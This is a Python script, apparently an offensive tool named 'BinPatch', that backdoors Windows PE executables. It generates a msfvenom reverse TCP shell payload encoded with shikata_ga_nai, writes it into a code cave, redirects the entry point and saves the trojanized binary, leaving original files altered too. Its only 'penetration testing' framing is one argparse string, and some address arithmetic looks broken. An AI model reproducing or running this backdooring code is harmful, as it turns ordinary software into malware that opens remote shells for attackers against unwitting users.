import argparse
import os
import subprocess
import pefile
import capstone
import shutil
import sys
from pathlib import Path

def check_binary_support(file_path):
    """Check if the binary is a supported PE, ELF, or Mach-O file."""
    try:
        with open(file_path, 'rb') as f:
            magic = f.read(4)
        if magic.startswith(b'\x4d\x5a'):  # MZ header for PE
            return 'PE'
        elif magic.startswith(b'\x7fELF'):  # ELF header
            return 'ELF'
        elif magic in [b'\xca\xfe\xba\xbe', b'\xce\xfa\xed\xfe', b'\xcf\xfa\xed\xfe']:  # Mach-O headers
            return 'Mach-O'
        else:
            raise ValueError("Unsupported binary format.")
    except Exception as e:
        print(f"[!] Error checking binary: {e}")
        sys.exit(1)

def find_code_caves(pe, min_size):
    """Find code caves in a PE binary suitable for shellcode."""
    caves = []
    for section in pe.sections:
        if section.Characteristics & 0x20:  # CODE section
            raw_data = section.get_data()
            md = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_32)
            i = 0
            while i < len(raw_data) - min_size:
                if raw_data[i:i+min_size].count(b'\x00') == min_size:
                    caves.append({
                        'section': section.Name.decode().rstrip('\x00'),
                        'offset': section.PointerToRawData + i,
                        'size': min_size
                    })
                    i += min_size
                else:
                    i += 1
    return caves

def generate_shellcode(lhost, lport, encoder='x86/shikata_ga_nai'):
    """Generate shellcode using msfvenom."""
    try:
        cmd = [
            'msfvenom', '-p', 'windows/shell_reverse_tcp',
            f'LHOST={lhost}', f'LPORT={lport}',
            '-b', '\\x00', '-e', encoder, '-f', 'raw'
        ]
        shellcode = subprocess.check_output(cmd, stderr=subprocess.STDOUT)
        print("[*] Shellcode generated successfully.")
        return shellcode
    except subprocess.CalledProcessError as e:
        print(f"[!] Error generating shellcode: {e.output.decode()}")
        sys.exit(1)

def patch_pe_binary(file_path, shellcode, lhost, lport):
    """Patch a PE binary with shellcode."""
    try:
        pe = pefile.PE(file_path)
        binary_type = check_binary_support(file_path)
        print(f"[*] Detected {binary_type} binary.")

        # Find code caves
        min_shellcode_size = len(shellcode) + 50  # Extra space for stub
        caves = find_code_caves(pe, min_shellcode_size)
        if not caves:
            print("[!] No suitable code caves found. Consider appending a section.")
            sys.exit(1)

        # Select first cave
        cave = caves[0]
        print(f"[*] Using cave in section {cave['section']} at offset 0x{cave['offset']:x} (size: {cave['size']} bytes).")

        # Create resume stub (simplified: jump back to original entry point)
        original_entry = pe.OPTIONAL_HEADER.AddressOfEntryPoint
        resume_stub = b'\xe9' + (original_entry - (cave['offset'] + len(shellcode) + 5)).to_bytes(4, 'little')

        # Patch shellcode into cave
        with open(file_path, 'rb') as f:
            data = bytearray(f.read())
        shellcode_with_stub = shellcode + resume_stub
        for i, byte in enumerate(shellcode_with_stub):
            data[cave['offset'] + i] = byte

        # Modify entry point to point to cave
        pe.OPTIONAL_HEADER.AddressOfEntryPoint = cave['offset']
        pe.write()

        # Save backdoored binary
        output_dir = 'backdoored'
        os.makedirs(output_dir, exist_ok=True)
        output_path = os.path.join(output_dir, os.path.basename(file_path))
        with open(output_path, 'wb') as f:
            f.write(data)
        print(f"[*] Backdoored binary saved to {output_path}")
    except Exception as e:
        print(f"[!] Error patching binary: {e}")
        sys.exit(1)

def main():
    parser = argparse.ArgumentParser(description="BinPatch: Patch binaries with shellcode for penetration testing.")
    parser.add_argument('-f', '--file', required=True, help="Path to the binary file (PE, ELF, Mach-O).")
    parser.add_argument('-H', '--host', required=True, help="LHOST for reverse shell (e.g., 192.168.1.100).")
    parser.add_argument('-P', '--port', required=True, help="LPORT for reverse shell (e.g., 4444).")
    parser.add_argument('-s', '--shellcode', default='reverse_shell_tcp', help="Shellcode type (default: reverse_shell_tcp).")
    parser.add_argument('-e', '--encoder', default='x86/shikata_ga_nai', help="Encoder for shellcode (default: x86/shikata_ga_nai).")
    args = parser.parse_args()

    # Check if binary exists
    if not os.path.exists(args.file):
        print(f"[!] File {args.file} does not exist.")
        sys.exit(1)

    # Generate shellcode
    shellcode = generate_shellcode(args.host, args.port, args.encoder)

    # Patch binary (only PE supported in this version)
    binary_type = check_binary_support(args.file)
    if binary_type == 'PE':
        patch_pe_binary(args.file, shellcode, args.host, args.port)
    else:
        print(f"[!] {binary_type} patching not supported in this version.")
        sys.exit(1)

if __name__ == "__main__":
    main()